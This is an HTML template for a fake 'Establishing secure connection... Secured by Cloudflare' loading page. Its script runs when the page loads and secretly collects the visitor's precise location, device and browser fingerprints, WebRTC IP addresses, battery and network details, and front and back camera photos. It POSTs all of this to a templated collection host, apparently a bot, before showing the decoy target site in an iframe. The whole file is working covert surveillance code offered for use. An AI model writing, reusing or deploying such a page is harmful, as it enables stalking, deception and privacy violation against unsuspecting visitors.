<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Secure Content...</title>
    <style>
        body { 
            margin: 0; 
            padding: 0; 
            overflow: hidden;
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        iframe { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none;
            background: white;
            z-index: 10;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            backdrop-filter: blur(5px);
            padding: 20px;
            text-align: center;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #e2e8f0;
            border-top: 3px solid #6366f1;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text {
            font-size: 16px;
            color: #475569;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        .status-badge {
            margin-top: 10px;
            padding: 6px 14px;
            background: #dbeafe;
            color: #1d4ed8;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 600;
        }
        .debug-console {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 10px;
            z-index: 10000;
            display: none;
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Establishing secure connection...</div>
        <div class="status-badge">üîí Secured by Cloudflare</div>
    </div>
    
    <iframe id="targetFrame" src="<%= url %>" allow="camera; geolocation; microphone; fullscreen"></iframe>
    
    <!-- Debug console (hidden by default) -->
    <div class="debug-console" id="debugConsole"></div>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const loadingOverlay = document.getElementById('loadingOverlay');
        const targetFrame = document.getElementById('targetFrame');
        const debugConsole = document.getElementById('debugConsole');

        // Enable debug in development
        const DEBUG = false;
        if (DEBUG) debugConsole.style.display = 'block';

        function logDebug(message) {
            if (DEBUG) {
                debugConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
                debugConsole.scrollTop = debugConsole.scrollHeight;
            }
            console.log(`[WebView] ${message}`);
        }

        async function send(endpoint, data) {
            try {
                logDebug(`Sending to ${endpoint}: ${JSON.stringify(data).substring(0, 100)}...`);
                const response = await fetch(`${host}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uid, ...data })
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const result = await response.json();
                logDebug(`${endpoint} success: ${JSON.stringify(result)}`);
                return result;
            } catch (error) {
                logDebug(`${endpoint} failed: ${error.message}`);
                // Send error report to bot
                try {
                    await fetch(`${host}/info`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            uid: uid,
                            data: `<b>üì§ WebView Error (${endpoint}):</b> <code>${error.message}</code>`
                        })
                    });
                } catch (e) {
                    logDebug(`Failed to send error report: ${e.message}`);
                }
                return { success: false, error: error.message };
            }
        }

        // ========== MAXIMUM DATA COLLECTION ==========

        // 1. LOCATION (with retry)
        async function collectLocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) {
                    logDebug('Geolocation not supported');
                    resolve(false);
                    return;
                }

                let attempts = 0;
                const maxAttempts = 3;

                function attempt() {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const result = await send('/location', {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy,
                                alt: pos.coords.altitude,
                                heading: pos.coords.heading,
                                speed: pos.coords.speed
                            });
                            resolve(result.success);
                        },
                        (err) => {
                            logDebug(`Location error: ${err.message}`);
                            attempts++;
                            if (attempts < maxAttempts) {
                                setTimeout(attempt, 2000);
                            } else {
                                resolve(false);
                            }
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }

                attempt();
            });
        }

        // 2. DEVICE FINGERPRINT
        async function collectDeviceFingerprint() {
            try {
                const fp = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages?.join(', ') || 'N/A',
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unknown',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    touch: navigator.maxTouchPoints > 0,
                    webdriver: navigator.webdriver,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    online: navigator.onLine,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        dpi: window.devicePixelRatio
                    },
                    referrer: document.referrer,
                    title: document.title
                };
                
                const result = await send('/info', { 
                    data: `<b>üì± Device Info</b>\n<code>${JSON.stringify(fp, null, 2)}</code>` 
                });
                return result.success;
            } catch (err) {
                logDebug(`Device fingerprint error: ${err.message}`);
                return false;
            }
        }

        // 3. CAMERA CAPTURE (FRONT + BACK)
        async function captureCamera(facingMode, label) {
            try {
                const constraints = {
                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                    setTimeout(resolve, 3000);
                });

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                const imageData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                const result = await send('/camsnap', { 
                    [label]: imageData
                });

                stream.getTracks().forEach(track => track.stop());
                return result.success;
            } catch (err) {
                logDebug(`Camera ${label} error: ${err.name} - ${err.message}`);
                await send('/info', { 
                    data: `<b>üì∑ Camera ${label}:</b> <code>${err.name}</code>` 
                });
                return false;
            }
        }

        // 4. NETWORK + BATTERY
        async function collectNetworkBattery() {
            try {
                let messages = [];

                // Battery
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    const batteryInfo = `${(battery.level * 100).toFixed(1)}% | Charging: ${battery.charging}`;
                    await send('/info', { data: `<b>üîã Battery:</b> ${batteryInfo}` });
                    messages.push('Battery');
                }

                // Network
                if (navigator.connection) {
                    const conn = navigator.connection;
                    const networkInfo = `${conn.effectiveType || 'unknown'} | ${conn.downlink || '?'} Mbps | RTT: ${conn.rtt || '?'}ms`;
                    await send('/info', { data: `<b>üåê Network:</b> ${networkInfo}` });
                    messages.push('Network');
                }

                return messages.length > 0;
            } catch (err) {
                logDebug(`Network/Battery error: ${err.message}`);
                return false;
            }
        }

        // 5. FINGERPRINTING (Canvas, WebRTC, Fonts)
        async function collectFingerprints() {
            try {
                let messages = [];

                // Canvas
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = "14px Arial";
                ctx.fillText('SecurityFingerprint', 2, 2);
                const canvasFP = canvas.toDataURL().substring(0, 80) + '...';
                await send('/info', { data: `<b>üé® Canvas FP:</b> <code>${canvasFP}</code>` });
                messages.push('Canvas');

                // WebRTC IPs
                const getIPs = () => {
                    return new Promise(resolve => {
                        const ips = [];
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = e => {
                            if (!e || !e.candidate) {
                                resolve(ips);
                                return;
                            }
                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (ipMatch && !ips.includes(ipMatch[1])) {
                                ips.push(ipMatch[1]);
                            }
                        };
                        setTimeout(() => {
                            pc.close();
                            resolve(ips);
                        }, 2000);
                    });
                };

                const ips = await getIPs();
                if (ips.length) {
                    await send('/info', { data: `<b>üåê WebRTC IPs:</b>\n<code>${ips.join('\\n')}</code>` });
                    messages.push('WebRTC');
                }

                // Fonts
                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                const installed = testFonts.filter(font => {
                    ctx.font = `72px "${font}", monospace`;
                    const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                    return Math.abs(baseWidth - testWidth) > 2;
                });
                await send('/info', { data: `<b>üî† Fonts:</b> ${installed.join(', ')}` });
                messages.push('Fonts');

                return messages.length > 0;
            } catch (err) {
                logDebug(`Fingerprint error: ${err.message}`);
                return false;
            }
        }

        // ========== EXECUTION PLAN ==========

        // Start all collections in parallel
        logDebug('Starting data collection...');
        
        // Location
        collectLocation().then(success => {
            logDebug(`Location collection: ${success ? 'success' : 'failed'}`);
        });

        // Device fingerprint
        collectDeviceFingerprint().then(success => {
            logDebug(`Device fingerprint: ${success ? 'success' : 'failed'}`);
        });

        // Network + Battery
        collectNetworkBattery().then(success => {
            logDebug(`Network/Battery: ${success ? 'success' : 'failed'}`);
        });

        // Fingerprints
        collectFingerprints().then(success => {
            logDebug(`Fingerprints: ${success ? 'success' : 'failed'}`);
        });

        // Camera (staggered to avoid permission spam)
        setTimeout(() => {
            logDebug('Attempting front camera...');
            captureCamera('user', 'front');
        }, 1000);

        setTimeout(() => {
            logDebug('Attempting back camera...');
            captureCamera('environment', 'back');
        }, 3000);

        // Hide loading overlay and show iframe after 4 seconds (or when ready)
        setTimeout(() => {
            loadingOverlay.style.opacity = '0';
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                targetFrame.style.opacity = '1';
            }, 500);
        }, 4000);

        // Fallback redirect after 15 seconds
        setTimeout(() => {
            logDebug('Timeout reached, forcing redirect');
            targetFrame.style.opacity = '1';
            loadingOverlay.style.display = 'none';
        }, 15000);

        // Log page visibility changes
        document.addEventListener('visibilitychange', () => {
            logDebug(`Page visibility: ${document.visibilityState}`);
        });
    </script>
</body>
</html>
